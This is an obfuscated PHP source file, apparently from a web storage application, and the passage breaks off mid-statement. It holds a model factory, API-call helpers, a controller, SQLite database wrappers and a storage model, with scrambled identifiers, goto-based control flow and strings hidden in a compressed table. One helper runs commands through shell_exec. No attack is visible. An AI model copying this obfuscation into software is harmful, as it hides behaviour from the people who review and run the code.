define($_SERVER[¯Ò¬Èè][0], $_SERVER[¯Ò¬Èè][1]); $_SERVER[™‡«†³Ğ] = explode($_SERVER[¯Ò¬Èè][2], gzinflate(substr($_SERVER[¯Ò¬Èè][3], 10, -8))); function Model($dİˆ—¯ÖÑ = '', $eÒŠÇ©â™± = '', $BŞò‰ø«Î = '') { goto cîÆ–ÉÏôç; EÙğ·îÚÉô: $B•Æ„®ÁãŸ[$Bê‹ğ¦·] = new ModelBase($dİˆ—¯ÖÑ, $eÒŠÇ©â™±, $BŞò‰ø«Î); return $B•Æ„®ÁãŸ[$Bê‹ğ¦·]; goto c…ÈŞ‘’Ò; cîÆ–ÉÏôç: $Døò†¿ãÁã =& $_SERVER[™‡«†³Ğ]; static $B•Æ„®ÁãŸ = array(); $Bê‹ğ¦· = strtolower($eÒŠÇ©â™± . $Døò†¿ãÁã[0] . $dİˆ—¯ÖÑ); goto cÃ‰Ÿ­İ; cÃ‰Ÿ­İ: if (isset($B•Æ„®ÁãŸ[$Bê‹ğ¦·])) { return $B•Æ„®ÁãŸ[$Bê‹ğ¦·]; } if ($dİˆ—¯ÖÑ) { $dİˆ—¯ÖÑ = strtoupper($dİˆ—¯ÖÑ[0]) . substr($dİˆ—¯ÖÑ, 1); $Aø‚½È³‘ = $dİˆ—¯ÖÑ . $Døò†¿ãÁã[1]; if (class_exists($Aø‚½È³‘)) { $B•Æ„®ÁãŸ[$Bê‹ğ¦·] = new $Aø‚½È³‘(); return $B•Æ„®ÁãŸ[$Bê‹ğ¦·]; } } if (!$BŞò‰ø«Î) { $BŞò‰ø«Î = $GLOBALS[$Døò†¿ãÁã[2]][$Døò†¿ãÁã[3]]; } goto EÙğ·îÚÉô; c…ÈŞ‘’Ò: } goto BŒ¶¥Ñàµø; bø‚¤ãØ¥‰: function ActionCall($eƒ¥¶©±Á) { $fí˜Íó¡è¢ = array_slice(func_get_args(), 1); return ActionApply($eƒ¥¶©±Á, $fí˜Íó¡è¢); } function ActionCallApi($f—Ÿ÷ëŸï, $e· Êá»¶ = '') { goto BµäÜñŞç­; aÉ®¬Ä Ş¦: return $bîœØÇó»“; goto fÑ –Óöˆ; C™¨Åù’Æ·: $EêÈî•Á¤É = phpBinCommand(); if ($EêÈî•Á¤É && function_exists($d¥ÇùŒÃé©[25])) { $C­ÆŠ‹ÀÔ = $EêÈî•Á¤É . $d¥ÇùŒÃé©[26] . BASIC_PATH . $d¥ÇùŒÃé©[27] . escapeshellarg($f—Ÿ÷ëŸï); $D§ïÇƒÓ÷¦ = shell_exec($C­ÆŠ‹ÀÔ); } if (!$D§ïÇƒÓ÷¦) { $A÷ÂÖäŠã” = stream_context_create(array($d¥ÇùŒÃé©[28] => array($d¥ÇùŒÃé©[29] => 20, $d¥ÇùŒÃé©[30] => $d¥ÇùŒÃé©[31]))); $D§ïÇƒÓ÷¦ = file_get_contents(APP_HOST . $d¥ÇùŒÃé©[32] . $f—Ÿ÷ëŸï, !1, $A÷ÂÖäŠã”); } goto E…í°ïçñ; BµäÜñŞç­: $d¥ÇùŒÃé© =& $_SERVER[™‡«†³Ğ]; $A“ïÁÜŠŒ› = $e· Êá»¶; if (is_array($e· Êá»¶)) { $A“ïÁÜŠŒ› = $d¥ÇùŒÃé©[20]; foreach ($e· Êá»¶ as $e“ø»ì›æá => $eÜÓ‹ëÑ) { $eÜÓ‹ëÑ = is_array($eÜÓ‹ëÑ) ? json_encode($eÜÓ‹ëÑ) : $eÜÓ‹ëÑ; $eÜÓ‹ëÑ = is_bool($eÜÓ‹ëÑ) ? intval($eÜÓ‹ëÑ) : $eÜÓ‹ëÑ; $A“ïÁÜŠŒ› .= $d¥ÇùŒÃé©[21] . $e“ø»ì›æá . $d¥ÇùŒÃé©[22] . rawurlencode($eÜÓ‹ëÑ); } } goto C§Ë‘ùŞ„; E…í°ïçñ: $E½£¬çœÌÄ = json_decode($D§ïÇƒÓ÷¦, !0); $bîœØÇó»“ = is_array($E½£¬çœÌÄ) ? $E½£¬çœÌÄ : array($d¥ÇùŒÃé©[33] => null, $d¥ÇùŒÃé©[34] => $D§ïÇƒÓ÷¦); if (!$E½£¬çœÌÄ) { echo $D§ïÇƒÓ÷¦; } goto aÉ®¬Ä Ş¦; C§Ë‘ùŞ„: $FÈ­–¥ˆËÀ = Action($d¥ÇùŒÃé©[23])->accessToken(); $f—Ÿ÷ëŸï = str_replace($d¥ÇùŒÃé©[5], $d¥ÇùŒÃé©[4], $f—Ÿ÷ëŸï) . $d¥ÇùŒÃé©[24] . $FÈ­–¥ˆËÀ . $A“ïÁÜŠŒ›; $D§ïÇƒÓ÷¦ = $d¥ÇùŒÃé©[20]; goto C™¨Åù’Æ·; fÑ –Óöˆ: } function ActionCallHook($f¨æÑµ³†) { goto c³Ù‡ğå; E­¤ß ¾¶: $GLOBALS[$eˆìù‰‡š[35]] = 1; $bÁŞ´©£Ò = ActionApply($f¨æÑµ³†, $B†Š…¿³Ÿ); $eê¨ïÚ…£Ü = ob_get_clean(); goto FÉ‘ñ§¬ñ—; FÉ‘ñ§¬ñ—: $bÁŞ´©£Ò = $eê¨ïÚ…£Ü ? json_decode($eê¨ïÚ…£Ü, !0) : $bÁŞ´©£Ò; $GLOBALS[$eˆìù‰‡š[35]] = 0; return $bÁŞ´©£Ò; goto CáøªôÂ”; c³Ù‡ğå: $eˆìù‰‡š =& $_SERVER[™‡«†³Ğ]; ob_start(); $B†Š…¿³Ÿ = array_slice(func_get_args(), 1); goto E­¤ß ¾¶; CáøªôÂ”: } goto CÉÆø¢Ãø¥; E“ÀÛğ‘Ÿê: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto c«ß”ù¸¯›; c«ß”ù¸¯›: $c®©³ÈÄ ¿ =& $_SERVER[¯Ò¬Èè]; global $in, $config; $this->config =& $config; goto Eøßøî¸ƒŒ; Eøßøî¸ƒŒ: $this->in =& $in; $this->values[$c®©³ÈÄ ¿[6]] =& $config; $this->values[$c®©³ÈÄ ¿[7]] =& $in; goto a¬‘ÁÕíò; a¬‘ÁÕíò: $this->tpl = TEMPLATE . MOD . $c®©³ÈÄ ¿[8]; $this->_classObjectID = mt_rand(0, 10000); goto fò¾’âô˜; fò¾’âô˜: } public function loadClass($C†Ş‰ŒµÆ’) { if (1 === func_num_args()) { $this->{$C†Ş‰ŒµÆ’} = new $C†Ş‰ŒµÆ’(); } else { $e“÷½ñ = new ReflectionClass($C†Ş‰ŒµÆ’); $c‚‰­Ë¢¥ = func_get_args(); array_shift($c‚‰­Ë¢¥); $this->{$C†Ş‰ŒµÆ’} = $e“÷½ñ->newInstanceArgs($c‚‰­Ë¢¥); } return $this->{$C†Ş‰ŒµÆ’}; } protected function assign($C‘ÔˆØ¢óŠ, $d¸÷›ö©¸) { $this->values[$C‘ÔˆØ¢óŠ] = $d¸÷›ö©¸; } protected function display($b¡ëœ–…§ç) { ob_end_clean(); extract($this->values); require $this->tpl . $b¡ëœ–…§ç; } } class DbSqliteBase extends Db { public function __construct($FçŒ…Ù„ëë = '') { $c“¤»Æ²ÛÁ =& $_SERVER[¯Ò¬Èè]; if (!extension_loaded($c“¤»Æ²ÛÁ[9])) { think_exception(think_lang($c“¤»Æ²ÛÁ[10]) . $c“¤»Æ²ÛÁ[11]); } if (!empty($FçŒ…Ù„ëë)) { if (!isset($FçŒ…Ù„ëë[$c“¤»Æ²ÛÁ[12]])) { $FçŒ…Ù„ëë[$c“¤»Æ²ÛÁ[12]] = 438; } $this->config = $FçŒ…Ù„ëë; if (empty($this->config[$c“¤»Æ²ÛÁ[13]])) { $this->config[$c“¤»Æ²ÛÁ[13]] = array(); } } } public function connect($C•—Ó‘âø‡ = '', $b«Šô¢ŸïÑ = 0) { $b«Ä½Ô”ß£ =& $_SERVER[¯Ò¬Èè]; if (!isset($this->linkID[$b«Šô¢ŸïÑ])) { goto d¢ºÚ•¥¶ß; cøè†ÎºÓ­: @sqlite_busy_timeout($this->linkID[$b«Šô¢ŸïÑ], 30000); if (1 != think_config($b«Ä½Ô”ß£[18])) { unset($this->config); } goto d„Úùì«¶‚; d¢ºÚ•¥¶ß: if (empty($C•—Ó‘âø‡)) { $C•—Ó‘âø‡ = $this->config; } $b©æ…ºÚÚ = !empty($C•—Ó‘âø‡[$b«Ä½Ô”ß£[13]][$b«Ä½Ô”ß£[14]]) ? $C•—Ó‘âø‡[$b«Ä½Ô”ß£[13]][$b«Ä½Ô”ß£[14]] : $this->pconnect; $E—‡á‘œ¡ = $b©æ…ºÚÚ ? $b«Ä½Ô”ß£[15] : $b«Ä½Ô”ß£[16]; goto cÒ°ÃÏ”Åò; cÒ°ÃÏ”Åò: $this->linkID[$b«Šô¢ŸïÑ] = $E—‡á‘œ¡($C•—Ó‘âø‡[$b«Ä½Ô”ß£[17]], $C•—Ó‘âø‡[$b«Ä½Ô”ß£[12]]); if (!$this->linkID[$b«Šô¢ŸïÑ]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto cøè†ÎºÓ­; d„Úùì«¶‚: } return $this->linkID[$b«Šô¢ŸïÑ]; } public function free() { $this->queryID = null; } public function query($E’è‹ÆÀ) { goto Fá£Ú§Ø‚„; AŠØ­Üîß: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $a ÍÁÖ = $this->getAll(); return $a ÍÁÖ; } goto C“™Øèá¿á; C²µ¯Ò‡áª: $this->queryStr = $E’è‹ÆÀ; if ($this->queryID) { $this->free(); } think_action_status($Dõº”ß‡Ä[19], 1); goto dÆäá²‘ ; Fá£Ú§Ø‚„: $Dõº”ß‡Ä =& $_SERVER[¯Ò¬Èè]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto C²µ¯Ò‡áª; dÆäá²‘ : think_status($Dõº”ß‡Ä[20]); $this->queryID = sqlite_query($this->_linkID, $E’è‹ÆÀ); $this->debug(); goto AŠØ­Üîß; C“™Øèá¿á: } public function execute($fµòíÕø¬) { goto DóŸŠÚ‚„ë; DóŸŠÚ‚„ë: $Fá¸Š®‹Šê =& $_SERVER[¯Ò¬Èè]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto eñ“¨™ˆÂ‘; eñ“¨™ˆÂ‘: $this->queryStr = $fµòíÕø¬; if ($this->queryID) { $this->free(); } think_action_status($Fá¸Š®‹Šê[21], 1); goto aöµ¥‡•«ñ; E›ßé¶†è÷: if (!1 === $aéé¡»Ã‡ø) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto bÔ™³Ç¯¨; aöµ¥‡•«ñ: think_status($Fá¸Š®‹Šê[20]); $aéé¡»Ã‡ø = sqlite_exec($this->_linkID, $fµòíÕø¬); $this->debug(); goto E›ßé¶†è÷; bÔ™³Ç¯¨: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¯Ò¬Èè][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $F ßöÈ½Ï· = sqlite_query($this->_linkID, $_SERVER[¯Ò¬Èè][23]); if (!$F ßöÈ½Ï·) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $B×ìÃØ‰Á‘ = sqlite_query($this->_linkID, $_SERVER[¯Ò¬Èè][24]); if (!$B×ìÃØ‰Á‘) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $C’êËè†é£ = array(); if ($this->numRows > 0) { for ($EÄÖŠ°Á = 0; $EÄÖŠ°Á < $this->numRows; $EÄÖŠ°Á++) { $C’êËè†é£[$EÄÖŠ°Á] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $C’êËè†é£; } public function getFields($B±°–›Âºª) { $dæµ¹éâé =& $_SERVER[¯Ò¬Èè]; $B…®“ ÷Ü = $this->query($dæµ¹éâé[25] . $B±°–›Âºª . $dæµ¹éâé[26]); $Aº„«»ëÍÄ = array(); if ($B…®“ ÷Ü) { foreach ($B…®“ ÷Ü as $DÄñƒ×ÑõÍ => $Aèøïœ­) { $Aº„«»ëÍÄ[$Aèøïœ­[$dæµ¹éâé[27]]] = array($dæµ¹éâé[28] => $Aèøïœ­[$dæµ¹éâé[27]], $dæµ¹éâé[29] => $Aèøïœ­[$dæµ¹éâé[30]], $dæµ¹éâé[31] => (bool) ($Aèøïœ­[$dæµ¹éâé[32]] === $dæµ¹éâé[33]), $dæµ¹éâé[34] => $Aèøïœ­[$dæµ¹éâé[35]], $dæµ¹éâé[36] => strtolower($Aèøïœ­[$dæµ¹éâé[37]]) == $dæµ¹éâé[38], $dæµ¹éâé[39] => strtolower($Aèøïœ­[$dæµ¹éâé[40]]) == $dæµ¹éâé[41]); } } return $Aº„«»ëÍÄ; } public function getTables($b¼‰«É‹ = '') { $f³Øáâ„Œ =& $_SERVER[¯Ò¬Èè]; $D³ï²÷‚šÚ = $this->query($f³Øáâ„Œ[42] . $f³Øáâ„Œ[43] . $f³Øáâ„Œ[44]); $fœõÑŞµ²™ = array(); foreach ($D³ï²÷‚šÚ as $eî¸¹ˆ »Ñ => $E„•óˆÓÀ) { $fœõÑŞµ²™[$eî¸¹ˆ »Ñ] = current($E„•óˆÓÀ); } return $fœõÑŞµ²™; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $d»Ûµ¤ôô„ =& $_SERVER[¯Ò¬Èè]; $Eæ…ğƒÄËœ = sqlite_last_error($this->_linkID); $this->error = $Eæ…ğƒÄËœ . $d»Ûµ¤ôô„[4] . sqlite_error_string($Eæ…ğƒÄËœ); if ($d»Ûµ¤ôô„[33] != $this->queryStr) { $this->error .= LNG($d»Ûµ¤ôô„[45]) . $this->queryStr; } think_trace($this->error, $d»Ûµ¤ôô„[33], $d»Ûµ¤ôô„[46]); return $this->error; } public function escapeString($D©ç°ôß˜¶) { return sqlite_escape_string($D©ç°ôß˜¶); } public function parseLimit($Aöõ„æ˜Á­) { $F³ö¬·ñØË =& $_SERVER[¯Ò¬Èè]; $E—¥ÙŠ†ºç = $F³ö¬·ñØË[33]; if (!empty($Aöõ„æ˜Á­)) { $Aöõ„æ˜Á­ = explode($F³ö¬·ñØË[47], $Aöõ„æ˜Á­); if (count($Aöõ„æ˜Á­) > 1) { $E—¥ÙŠ†ºç .= $F³ö¬·ñØË[48] . $Aöõ„æ˜Á­[1] . $F³ö¬·ñØË[49] . $Aöõ„æ˜Á­[0] . $F³ö¬·ñØË[50]; } else { $E—¥ÙŠ†ºç .= $F³ö¬·ñØË[48] . $Aöõ„æ˜Á­[0] . $F³ö¬·ñØË[50]; } } return $E—¥ÙŠ†ºç; } } class DbSqlite3Base extends Db { public function __construct($a”»†­÷Èä = '') { $B‘”–â… =& $_SERVER[¯Ò¬Èè]; if (!class_exists($B‘”–â…[51])) { think_exception(think_lang($B‘”–â…[10]) . $B‘”–â…[52]); } if (!empty($a”»†­÷Èä)) { if (!isset($a”»†­÷Èä[$B‘”–â…[12]])) { $a”»†­÷Èä[$B‘”–â…[12]] = 438; } $this->config = $a”»†­÷Èä; if (empty($this->config[$B‘”–â…[13]])) { $this->config[$B‘”–â…[13]] = array(); } } } public function connect($cÑõÆáŒÄ³ = '', $DÌÙ½Õ„ç¥ = 0) { $fÕòÀ†Ê®Ã =& $_SERVER[¯Ò¬Èè]; if (!isset($this->linkID[$DÌÙ½Õ„ç¥])) { if (empty($cÑõÆáŒÄ³)) { $cÑõÆáŒÄ³ = $this->config; } $this->linkID[$DÌÙ½Õ„ç¥] = new SQLite3($cÑõÆáŒÄ³[$fÕòÀ†Ê®Ã[17]]); if (!$this->linkID[$DÌÙ½Õ„ç¥]) { think_exception($this->linkID[$DÌÙ½Õ„ç¥]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$DÌÙ½Õ„ç¥]->busyTimeout(30000); if (1 != think_config($fÕòÀ†Ê®Ã[18])) { unset($this->config); } } return $this->linkID[$DÌÙ½Õ„ç¥]; } public function free() { $this->queryID = null; } public function query($AğŠ¼­†—¤) { goto D‹ªŸİ„ó; eìÑŒ—ˆî¾: $this->queryStr = $AğŠ¼­†—¤; if ($this->queryID) { $this->free(); } think_action_status($FµÉ—à‹ [19], 1); goto eÀĞÈ¨åğ; còÉ‰§…†: if (!1 === $this->queryID) { $this->error(); return !1; } else { $c›àŞ­·Œ = $this->getAll(); $this->numRows = count($c›àŞ­·Œ); return $c›àŞ­·Œ; } goto CŸ¸÷Ã£éÂ; D‹ªŸİ„ó: $FµÉ—à‹  =& $_SERVER[¯Ò¬Èè]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto eìÑŒ—ˆî¾; eÀĞÈ¨åğ: think_status($FµÉ—à‹ [20]); $this->queryID = $this->_linkID->query($AğŠ¼­†—¤); $this->debug(); goto còÉ‰§…†; CŸ¸÷Ã£éÂ: } public function execute($e™ñâ½Šœ) { goto Dñî­•ã×; D±Êô Š…: think_status($Cô¨Îäåâ[20]); $f‹„”’ê³ = $this->_linkID->exec($e™ñâ½Šœ); $this->debug(); goto A—ªƒ›½Ø; Dñî­•ã×: $Cô¨Îäåâ =& $_SERVER[¯Ò¬Èè]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto fÅŞøŒ‹¸„; fÅŞøŒ‹¸„: $this->queryStr = $e™ñâ½Šœ; if ($this->queryID) { $this->free(); } think_action_status($Cô¨Îäåâ[21], 1); goto D±Êô Š…; A—ªƒ›½Ø: if (!1 === $f‹„”’ê³) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto DÄÔĞ¨–á; DÄÔĞ¨–á: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¯Ò¬Èè][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $eÑ¤²ÂŒİ = $this->_linkID->query($_SERVER[¯Ò¬Èè][23]); if (!$eÑ¤²ÂŒİ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Fâ½š¯²‚ = $this->_linkID->query($_SERVER[¯Ò¬Èè][24]); if (!$Fâ½š¯²‚) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $D È™»°™¤ = array(); while ($cÚÓÅù¡çé = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $D È™»°™¤[] = $cÚÓÅù¡çé; } $this->queryID->reset(); return $D È™»°™¤; } public function getFields($a®ŒËª†õ) { $dÑ¸˜È‚àÙ =& $_SERVER[¯Ò¬Èè]; $e°¯¶ï¤Ç = $this->query($dÑ¸˜È‚àÙ[25] . $a®ŒËª†õ . $dÑ¸˜È‚àÙ[26]); $AÆïƒ¹ˆ«ˆ = array(); if ($e°¯¶ï¤Ç) { foreach ($e°¯¶ï¤Ç as $B“ƒˆºÍªŠ => $f¯ÛÆ¶ƒµ¯) { $AÆïƒ¹ˆ«ˆ[$f¯ÛÆ¶ƒµ¯[$dÑ¸˜È‚àÙ[28]]] = array($dÑ¸˜È‚àÙ[28] => $f¯ÛÆ¶ƒµ¯[$dÑ¸˜È‚àÙ[28]], $dÑ¸˜È‚àÙ[29] => $f¯ÛÆ¶ƒµ¯[$dÑ¸˜È‚àÙ[29]], $dÑ¸˜È‚àÙ[31] => (bool) ($f¯ÛÆ¶ƒµ¯[$dÑ¸˜È‚àÙ[31]] === $dÑ¸˜È‚àÙ[33]), $dÑ¸˜È‚àÙ[34] => $f¯ÛÆ¶ƒµ¯[$dÑ¸˜È‚àÙ[53]], $dÑ¸˜È‚àÙ[36] => (bool) $f¯ÛÆ¶ƒµ¯[$dÑ¸˜È‚àÙ[54]], $dÑ¸˜È‚àÙ[39] => (bool) $f¯ÛÆ¶ƒµ¯[$dÑ¸˜È‚àÙ[54]]); } } return $AÆïƒ¹ˆ«ˆ; } public function getTables($B÷Ìé²ÎÔ = '') { $FÂà øì‹ø =& $_SERVER[¯Ò¬Èè]; $f”ƒ¼×ò¢ = $this->query($FÂà øì‹ø[42] . $FÂà øì‹ø[43] . $FÂà øì‹ø[44]); $BåÑ±òäö° = array(); foreach ($f”ƒ¼×ò¢ as $DœÚ¼ØñÙ => $d”‘¼°¤ñ) { $BåÑ±òäö°[$DœÚ¼ØñÙ] = current($d”‘¼°¤ñ); } return $BåÑ±òäö°; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $eºİºïØùÅ =& $_SERVER[¯Ò¬Èè]; $this->error = $this->_linkID->lastErrorMsg(); if ($eºİºïØùÅ[33] != $this->queryStr) { $this->error .= LNG($eºİºïØùÅ[45]) . $this->queryStr; } think_trace($this->error, $eºİºïØùÅ[33], $eºİºïØùÅ[46]); return $this->error; } public function escapeString($A¿­çó¨Ö) { $bĞßÌœË =& $_SERVER[¯Ò¬Èè]; if ($this->_linkID) { return $this->_linkID->escapeString($A¿­çó¨Ö); } return str_ireplace($bĞßÌœË[55], $bĞßÌœË[56], $A¿­çó¨Ö); } public function parseLimit($f›¦Æ‡’ÌÈ) { $D›ªÇµÒˆ =& $_SERVER[¯Ò¬Èè]; $d„‚­º‹· = $D›ªÇµÒˆ[33]; if (!empty($f›¦Æ‡’ÌÈ)) { $f›¦Æ‡’ÌÈ = explode($D›ªÇµÒˆ[47], $f›¦Æ‡’ÌÈ); if (count($f›¦Æ‡’ÌÈ) > 1) { $d„‚­º‹· .= $D›ªÇµÒˆ[48] . $f›¦Æ‡’ÌÈ[1] . $D›ªÇµÒˆ[49] . $f›¦Æ‡’ÌÈ[0] . $D›ªÇµÒˆ[50]; } else { $d„‚­º‹· .= $D›ªÇµÒˆ[48] . $f›¦Æ‡’ÌÈ[0] . $D›ªÇµÒˆ[50]; } } return $d„‚­º‹·; } } goto E‹­‹î„ã; dÜÕÕ•†Íƒ: class StorageModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\155\56\163\164\x6f\162\141\x67\145\x4c\151\x73\164"; public $field = array("\x6e\x61\155\x65", "\x73\x69\x7a\145\115\x61\x78", "\163\171\x73\164\145\155", "\144\x65\x66\141\x75\x6c\x74", "\x64\162\x69\166\145\x72", "\x63\x6f\156\146\151\147"); public function listData($Añ ¬“´´½ = false, $aäŸóÁ¬ = "\155\157\x64\151\146\171\x54\151\x6d\145", $C¶ÖêùåÌ˜ = false) { goto dè™æ´Œ¯ø; d‡Å¿Èùİå: foreach ($e¦¨Û’Ó„è as $AÏõÛæ¥¹Ä => $a×†„é÷Ì) { unset($e¦¨Û’Ó„è[$AÏõÛæ¥¹Ä][$b××Àñ‹šœ[6]]); $e¦¨Û’Ó„è[$AÏõÛæ¥¹Ä][$b××Àñ‹šœ[2100]] = 0; } $D¯ê”òÔ˜ù = array_to_keyvalue($e¦¨Û’Ó„è, $b××Àñ‹šœ[33], $b××Àñ‹šœ[367]); $this->_listAppendSize($e¦¨Û’Ó„è, $D¯ê”òÔ˜ù); goto aÉß’Ïîòœ; aÉß’Ïîòœ: return $e¦¨Û’Ó„è; goto F¨‚Ë ¤; dè™æ´Œ¯ø: $b××Àñ‹šœ =& $_SERVER[¯Ò¬Èè]; $e¦¨Û’Ó„è = parent::listData($Añ ¬“´´½, $aäŸóÁ¬, $C¶ÖêùåÌ˜); if ($Añ ¬“´´½) { return $e¦¨Û’Ó„è; } goto d‡Å¿Èùİå; F¨‚Ë ¤: } public function _listAppendSize(&$aÏ¥è½’‘, $BÅõùŒŞ†) { $DÆÃ»Œïìš =& $_SERVER[¯Ò¬Èè]; if (!$BÅõùŒŞ†) { return; } $aÌŠßÛö„ = $DÆÃ»Œïìš[2375] . implode($DÆÃ»Œïìš[47], $BÅõùŒŞ†) . $DÆÃ»Œïìš[2376]; $EÕì£šÀˆÎ = Model($DÆÃ»Œïìš[733])->query($aÌŠßÛö„); $EÕì£šÀˆÎ = array_to_keyvalue($EÕì£šÀˆÎ, $DÆÃ»Œïìš[367], $DÆÃ»Œïìš[77]); foreach ($aÏ¥è½’‘ as $C«˜ï°”î³ => $A¸™¿è‹†Ó) { $aÏ¥è½’‘[$C«˜ï°”î³][$DÆÃ»Œïìš[2100]] = isset($EÕì£šÀˆÎ[$A¸™¿è‹†Ó[$DÆÃ»Œïìš[367]]]) ? $EÕì£šÀˆÎ[$A¸™¿è‹†Ó[$DÆÃ»Œïìš[367]]] : 0; } } public function getConfig($CçØùÜ…Í¤) { $A„Ô£ù”¸… = parent::listData($CçØùÜ…Í¤); return json_decode($A„Ô£ù”¸…[$_SERVER[¯Ò¬Èè][6]], !0); } public function update($F›óï˜ïë, $a£òÍá¦ñ¥) { goto A”ğ—‚Ùõï; A”ğ—‚Ùõï: $d»™Ì×Í’™ =& $_SERVER[¯Ò¬Èè]; $CŞåÖ Ù’Ó = $a£òÍá¦ñ¥[$d»™Ì×Í’™[28]]; $fÙ§·¾ÛÚæ = array_to_keyvalue(parent::listData(), $d»™Ì×Í’™[28]); goto B¡ëƒïä¡½; fò·‰¨èß: $C½˜ì®š´ñ = parent::update($F›óï˜ïë, $a£òÍá¦ñ¥); if ($C½˜ì®š´ñ && $a£òÍá¦ñ¥[$d»™Ì×Í’™[34]]) { foreach ($fÙ§·¾ÛÚæ as $dÈ´ƒé»ÏÅ) { if ($dÈ´ƒé»ÏÅ[$d»™Ì×Í’™[34]] && $dÈ´ƒé»ÏÅ[$d»™Ì×Í’™[367]] != $F›óï˜ïë) { parent::update($dÈ´ƒé»ÏÅ[$d»™Ì×Í’™[367]], array($d»™Ì×Í’™[34] => 0)); } } } return $C½˜ì®š´ñ; goto D’‡´¾¡®‚; B¡ëƒïä¡½: if (isset($fÙ§·¾ÛÚæ[$CŞåÖ Ù’Ó]) && $fÙ§·¾ÛÚæ[$CŞåÖ Ù’Ó][$d»™Ì×Í’™[367]] != $F›óï˜ïë) { return !1; } if (isset($a£òÍá¦ñ¥[$d»™Ì×Í’™[2377]]) && $a£òÍá¦ñ¥[$d»™Ì×Í’™[2377]] == $d»™Ì×Í’™[83]) { $this->checkConfig($a£òÍá¦ñ¥); } unset($a£òÍá¦ñ¥[$d»™Ì×Í’™[2377]]); goto fò·‰¨èß; D’‡´¾¡®‚: } public function add($d¸·Ëèñ¨š) { goto aÀõ¾Ÿ¨³; aÀõ¾Ÿ¨³: $Fñ§ïö¤÷ =& $_SERVER[¯Ò¬Èè]; $cÉ“ëìå±º = array_to_keyvalue(parent::listData(), $Fñ§ïö¤÷[28]); if (isset($cÉ“ëìå±º[$d¸·Ëèñ¨š[$Fñ§ïö¤÷[28]]])) { return !1; } goto CÎï„Â­À; FÎ˜×á³‘: return $Fè²Œ™‹À‰; goto eí¯·¸ˆÜ; CÎï„Â­À: $this->checkConfig($d¸·Ëèñ¨š); $Fè²Œ™‹À‰ = parent::insert($d¸·Ëèñ¨š); if ($Fè²Œ™‹À‰ && $d¸·Ëèñ¨š[$Fñ§ïö¤÷[34]]) { foreach ($cÉ“ëìå±º as $b¦à¨¢À™) { if ($b¦à¨¢À™[$Fñ§ïö¤÷[34]]) { parent::update($b¦à¨¢À™[$Fñ§ïö¤÷[367]], array($Fñ§ïö¤÷[34] => 0)); } } } goto FÎ˜×á³‘; eí¯·¸ˆÜ: } public function checkConfig(&$e¶ãœ­êÚ) { goto D¥ÊÍ™¶œ»; eÓµÁ™ÃÁí: $c²›¥ÌÄœÁ[$f–ò• ÌÑ½[1033]] = $bĞïä¬¨ÛÓ; $e¶ãœ­êÚ[$f–ò• ÌÑ½[6]] = json_encode($c²›¥ÌÄœÁ); $e¶ãœ­êÚ[$f–ò• ÌÑ½[90]] = $FåÑŞİ¤; goto CÄ‡‚°éª; D¥ÊÍ™¶œ»: $f–ò• ÌÑ½ =& $_SERVER[¯Ò¬Èè]; $C¯§ÑÜÀä¿ = strtolower($e¶ãœ­êÚ[$f–ò• ÌÑ½[90]]); $c²›¥ÌÄœÁ = json_decode($e¶ãœ­êÚ[$f–ò• ÌÑ½[6]], !0); goto CÍœ¬¹¶‘; a‹¨ò¸¾: $aÚîß‚Ä© = $f–ò• ÌÑ½[71] . $FåÑŞİ¤; $D†ŒƒëÄè× = new $aÚîß‚Ä©($c²›¥ÌÄœÁ); if (in_array($C¯§ÑÜÀä¿, $D†ŒƒëÄè×->objectDriver)) { if (!$D†ŒƒëÄè×->isBucketCors() && !$D†ŒƒëÄè×->setBucketCors()) { $C‰„×àœ‹Œ = LNG($f–ò• ÌÑ½[2379]); $C‰„×àœ‹Œ .= $f–ò• ÌÑ½[2380] . LNG($f–ò• ÌÑ½[2381]); show_json($C‰„×àœ‹Œ, !1); } } goto fõìÈ¨Â™Ò; CÄ‡‚°éª: return !0; goto D®‹ñô¯; fõìÈ¨Â™Ò: $bĞïä¬¨ÛÓ = rtrim($c²›¥ÌÄœÁ[$f–ò• ÌÑ½[1033]], $f–ò• ÌÑ½[8]) . $f–ò• ÌÑ½[8]; $B´È¨çë… = $D†ŒƒëÄè×->getPath($bĞïä¬¨ÛÓ . $f–ò• ÌÑ½[1995]); if (!$D†ŒƒëÄè×->mkfile($B´È¨çë…)) { show_json(LNG($f–ò• ÌÑ½[2379]), !1); } goto eÓµÁ™ÃÁí; CÍœ¬¹¶‘: foreach ($c²›¥ÌÄœÁ as $e ›¼µ¥ï => $aÚÎ©Å™ƒ­) { $c²›¥ÌÄœÁ[$e ›¼µ¥ï] = trim($aÚÎ©Å™ƒ­); } $c²›¥ÌÄœÁ[$f–ò• ÌÑ½[2378]] = rand_string(6); $FåÑŞİ¤ = 